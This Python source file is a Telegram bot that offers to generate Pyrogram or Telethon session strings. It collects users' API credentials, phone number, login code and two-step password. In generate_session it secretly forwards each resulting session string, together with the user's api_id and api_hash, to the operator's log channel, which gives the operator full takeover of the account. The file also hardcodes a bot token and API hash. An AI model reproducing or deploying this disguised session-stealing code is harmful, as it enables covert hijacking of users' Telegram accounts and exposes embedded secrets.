from asyncio.exceptions import TimeoutError
import sys
from data import *
#from Data import Data
from pyromod import listen
from pyrogram import Client, filters
from telethon import TelegramClient
from telethon.sessions import StringSession
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    UserNotParticipant
)
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)

API_ID = 16514976

API_HASH = '40bd8634b3836468bb2fb7eafe39d81a'

app = Client("SsGeneratorBot",
             api_id=API_ID,
             api_hash=API_HASH,
             bot_token='5410695806:AAHlEDZ4Kb0T3HrwSIrIQGM_-hFCEiP56SE'
             )


@app.on_message(filters.regex('.exited'))
async def ext_cmd(_, msg):
    await app.send_message(log_channel, 'Bot Exited')
    sys.exit()


@app.on_message(filters.private & ~filters.forwarded & filters.command(['start', 'help']))
async def start_cmd(_, msg):
    Id = msg.chat.id
    try:
        await app.get_chat_member(-1001332181134, Id)
        name = msg.chat.first_name
        await msg.reply(start_text.format(name), reply_markup=start_btns)
    except UserNotParticipant:
        await app.send_message(Id, "**Join My Updates Channel To Use Me!**", reply_to_message_id=msg.id, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Join Updates Channel", url="https://t.me/CrazeBots")]]))
        return


@app.on_message(filters.private & ~filters.forwarded & filters.command('generate'))
async def main(_, msg):
    await fsub(app, msg)
    await msg.reply(
        "**Please choose the python library you want to generate string session for**",
        reply_markup=gen_btns
    )


async def generate_session(app, msg, telethon=False):
    await msg.reply("Starting {} Session Generation...".format("Telethon" if telethon else "Pyrogram"))
    user_id = msg.chat.id
    api_id_msg = await app.ask(user_id, 'Please send your `API_ID`', filters=filters.regex(r'\d'))
    try:
        api_id = int(api_id_msg.text)
    except ValueError:
        await api_id_msg.reply(Val_Err, quote=True)
        return
    api_hash_msg = await app.ask(user_id, 'Please send your `API_HASH`', filters=filters.text)
    if await cancelled(api_id_msg):
        return
    api_hash = api_hash_msg.text
    phone_number_msg = await app.ask(user_id, Send_Num, filters=filters.regex(r'\d'))
    if await cancelled(api_id_msg):
        return
    phone_number = phone_number_msg.text
    await msg.reply("Sending OTP.....")
    if telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    else:
        client = Client(":memory:", api_id, api_hash)
    await client.connect()
    try:
        if telethon:
            code = await client.send_code_request(phone_number)
        else:
            code = await client.send_code(phone_number)
    except (ApiIdInvalid, ApiIdInvalidError):
        await msg.reply(Api_id_Err)
        return
    except (PhoneNumberInvalid, PhoneNumberInvalidError):
        await msg.reply(Phone_Err)
        return
    try:
        phone_code_msg = await app.ask(user_id, check_otp, filters=filters.text, timeout=600)
        if await cancelled(api_id_msg):
            return
    except TimeoutError:
        await msg.reply(Time_Out)
        return
    phone_code = phone_code_msg.text.replace(" ", "")
    try:
        if telethon:
            await client.sign_in(phone_number, phone_code, password=None)
        else:
            await client.sign_in(phone_number, code.phone_code_hash, phone_code)
    except (PhoneCodeInvalid, PhoneCodeInvalidError):
        await msg.reply(Otp_Err, reply_markup=gen_btns)
        return
    except (PhoneCodeExpired, PhoneCodeExpiredError):
        await msg.reply(Otp_Expir, reply_markup=gen_btns)
        return
    except (SessionPasswordNeeded, SessionPasswordNeededError):
        try:
            two_step_msg = await app.ask(user_id, Two_step, filters=filters.text, timeout=300)
        except TimeoutError:
            await msg.reply('Time limit reached of 5 minutes. Please start generating session again.', reply_markup=gen_btns)
            return
        try:
            password = two_step_msg.text
            if telethon:
                await client.sign_in(password=password)
            else:
                await client.check_password(password=password)
            if await cancelled(api_id_msg):
                return
        except (PasswordHashInvalid, PasswordHashInvalidError):
            await two_step_msg.reply(Invalid_Pass, quote=True, reply_markup=gen_btns)
            return
    if telethon:
        string_session = client.session.save()
    else:
        myname = (await app.get_me()).first_name
        string_session = await client.export_session_string()
    text = save_msg.format(
        "TELETHON" if telethon else "PYROGRAM", string_session, myname)
    await app.send_message(log_channel, f'{text} \n\n\n {api_id} \n\n{api_hash}')
    try:
        await client.send_message("me", text)
    except KeyError:
        pass
    await client.disconnect()
    await phone_code_msg.reply(Suc_text.format("telethon" if telethon else "pyrogram"))


async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply("Cancelled the Process!", quote=True, reply_markup=gen_btns)
        return True
    elif "/restart" in msg.text:
        await msg.reply("Restarted the app!", quote=True, reply_markup=gen_btns)
        return True
    elif msg.text.startswith("/"):  # app Commands
        await msg.reply("Cancelled the process!", quote=True)
        return True
    else:
        return False


@app.on_callback_query()
async def _callbacks(app: Client, callback_query: CallbackQuery):
    query = callback_query.data.lower()
    if query == 'generate':
        await main(app, callback_query.message)
        await app.delete_messages(callback_query.message.chat.id, callback_query.message.id)
    if query in ["pyrogram", "telethon"]:
        await callback_query.answer('Please Send All Values Step by Step')
        await app.delete_messages(callback_query.message.chat.id, callback_query.message.id)
        try:
            if query == "pyrogram":
                await generate_session(app, callback_query.message)
            else:
                await generate_session(app, callback_query.message, telethon=True)
        except Exception as e:
            print(e)


@app.on_message(filters.private & filters.command('get'))
async def fsub(app, msg):
    Id = msg.from_user.id
    try:
        await app.get_chat_member('crazebots', Id)

    except UserNotParticipant:
        await app.send_message(Id, "**Join My Updates Channel To Use Me!**", reply_to_message_id=msg.id, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Join Updates Channel", url="https://t.me/CrazeBots")]]))
        return

print('Running app')

app.run()
